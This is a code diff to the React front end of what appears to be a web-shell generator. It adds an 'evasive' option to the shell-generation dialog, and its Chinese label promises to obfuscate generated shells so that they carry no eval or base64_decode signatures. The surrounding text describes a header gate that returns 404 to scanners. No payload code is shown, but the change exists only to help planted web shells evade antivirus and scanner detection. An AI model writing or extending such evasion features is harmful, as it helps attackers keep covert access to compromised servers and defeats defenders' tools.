@@ -198,6 +198,7 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
   const [pwd, setPwd] = React.useState("");
   const [gateHeader, setGateHeader] = React.useState("");
   const [gateValue, setGateValue] = React.useState("");
+  const [evasive, setEvasive] = React.useState(false);
   const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
   const [busy, setBusy] = React.useState(false);
   const [copied, setCopied] = React.useState(false);
@@ -206,7 +207,7 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
     if (!pwd.trim()) return void window.alert("密码必填");
     setBusy(true);
     try {
-      const r = await api.wsGenerate({ script_type: st, encoder: enc, password: pwd, gate_header: gateHeader, gate_value: gateValue });
+      const r = await api.wsGenerate({ script_type: st, encoder: enc, password: pwd, gate_header: gateHeader, gate_value: gateValue, evasive });
       setGen(r.data);
     } catch (e) {
       window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
@@ -234,6 +235,10 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
             <Input placeholder="Header Gate 头名（可选）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
             <Input placeholder="Gate 值（缺头 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
           </div>
+          <label className="flex items-center gap-1.5 text-xs">
+            <input type="checkbox" checked={evasive} onChange={(e) => setEvasive(e.target.checked)} />
+            免杀变形（函数名拼接/变量随机/伪装注释——明文无 eval/base64_decode 等特征）
+          </label>
           <div className="text-[11px] text-muted-foreground">
             Header Gate：缺校验头直接 404，对抗扫描器。连接目标时把同名头写进「附加头 JSON」。
           </div>
